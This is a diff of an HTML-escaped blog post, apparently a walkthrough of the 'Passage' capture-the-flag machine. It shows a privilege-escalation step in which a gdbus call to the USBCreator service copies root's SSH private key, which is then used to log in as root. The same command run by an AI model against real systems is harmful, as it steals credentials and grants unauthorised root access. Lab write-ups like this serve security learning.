@@ -275,8 +275,16 @@ after that i used the command to get the ssh key of the root user and copied to 
 &lt;/blockquote&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true
 &lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;so let login to the root user....&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;$ssh -i root.key root@passage.htb
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;copy the key file to my machine and saved it with name root.key then give the permission&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ chmod 600 root.key&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;so let login to the root user.... BOOM&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user@home:~$ ssh -i root.key &lt;a href=&#34;mailto:root@passage.htb&#34;&gt;root@passage.htb&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;#ssh -i root.key root@passage.htb
 &lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
 &lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;root@passage:~# id
 &lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;uid=0(root) gid=0(root) groups=0(root)
